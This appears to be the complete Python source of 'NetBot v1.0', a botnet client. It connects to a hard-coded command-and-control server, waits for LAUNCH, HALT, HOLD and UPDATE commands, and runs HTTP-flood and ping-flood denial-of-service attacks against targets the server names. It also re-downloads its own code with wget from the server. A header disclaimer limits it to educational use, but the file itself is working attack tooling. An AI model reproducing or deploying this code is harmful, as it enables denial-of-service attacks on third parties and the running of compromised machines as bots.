#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran
# Tool 		 : NetBot v1.0
# 
# Description	 : This is a command & control center client-server code.
#              		Should be used only for educational, research purposes and internal use only.
#

import socket
import time
import threading
import time
#import requests
import os
import urllib.request
import subprocess
import signal



class launchAttack:
      
	def __init__(self):
		self._running = True
      
	def terminate(self):
		self._running = False
      
	def run(self, n):
		run = 0
		#terminate = 0
		if n[3]=="HTTPFLOOD":
			while self._running and attackSet:
				url_attack = 'http://'+n[0]+':'+n[1]+'/'
				u = urllib.request.urlopen(url_attack).read()
				time.sleep(int(n[4]))

		if n[3]=="PINGFLOOD":
			while self._running:
				if attackSet:
					if run == 0:
						url_attack = 'ping '+n[0]+' -i 0.0000001 -s 65000 > /dev/null 2>&1'
						pro = subprocess.Popen(url_attack, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
						run = 1
				else:
					if run == 1:
						os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
						run = 0
						break
				


def Main():

	#Flags
	global attackSet
	attackSet = 0
	global updated
	updated = 0
	global terminate
	terminate = 0


	host = '192.168.0.174' # NetBot CCC Server
	port = 5555 # NetBot CCC Port

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Establishing a TCP Connection
	try:
		s.connect((host,port)) # Connect to the CCC Server
		message = "HEARTBEAT" # Sends Alive Pings to CCC Server
		
	except:
		print("CCC Server not online. Retrying every 15 seconds...")
		updated = 0
		time.sleep(15)
		Main()
		
	while True:

		# message sent to server
		try:
			s.send(message.encode()) # use a try catch 	

		except:
			Main()
		# message received from server
		data = s.recv(1024)

		# print the received message
		#print('CCC Response:',str(data.decode()))

		data = str(data.decode())
		data = data.split('_')
		#print('CCC Response: ', data)  #check list empty code
		if len(data) > 1:
			
			attStatus = data[2]
			attHost = data[0]
			attPort = data[1]
		else:
			attStatus = "OFFLINE"
			

		print('CCC Response: ', attStatus)
		
		if attStatus == "LAUNCH":
			if attackSet == 0:
				# start a new thread and start the attack (create a new process)
				attackSet = 1
				c = launchAttack()
				t = threading.Thread(target = c.run, args =(data, ))
				t.start()
				
			else:
				time.sleep(15)
				if t.is_alive():
					print('Attack in Progress...')
			#else: 
			continue
		elif attStatus == "HALT":
			attackSet = 0
			time.sleep(30)
			continue
		elif attStatus == "HOLD":
			attackSet = 0
			print('Waiting for Instructions from CCC. Retrying in 30 seconds...')
			time.sleep(30)
		elif attStatus == "UPDATE":
			if updated == 0:
				attackSet = 0
				os.system('wget -N http://192.168.0.174/netbot_client.py -O netbot_client.py > /dev/null 2>&1')
				print('Client Libraries Updated')
				updated = 1
				time.sleep(30)
			else:
				time.sleep(30)
		else:
			attackSet = 0
			print('Command Server Offline. Retrying in 30 seconds...')
			updated = 0
			time.sleep(30)
	# close the connection
	s.close()

if __name__ == '__main__':
	Main()